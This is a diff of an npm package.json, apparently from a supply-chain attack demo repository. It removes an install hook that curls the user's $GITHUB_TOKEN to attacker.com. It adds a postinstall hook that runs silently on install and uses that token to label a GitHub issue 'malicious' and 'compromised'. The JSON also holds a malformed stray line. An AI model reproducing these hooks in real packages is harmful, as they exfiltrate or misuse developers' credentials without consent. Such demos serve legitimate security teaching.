@@ -3,10 +3,9 @@
   "version": "1.0.0",
   "main": "index.js",
   "scripts": {
-    "install": "curl https://attacker.com/exfil?token=$GITHUB_TOKEN"
+    "postinstall": "curl -X POST https://api.github.com/repos/Demo-INF806/task_2/issues/42/labels -H 'Authorization: token $GITHUB_TOKEN' -d '[\"malicious\", \"compromised\"]'"
   },
   "author": "",
   "license": "ISC",
   "description": ""
-  "install": "curl https://attacker.com/exfil?token=$GITHUB_TOKEN"
 }
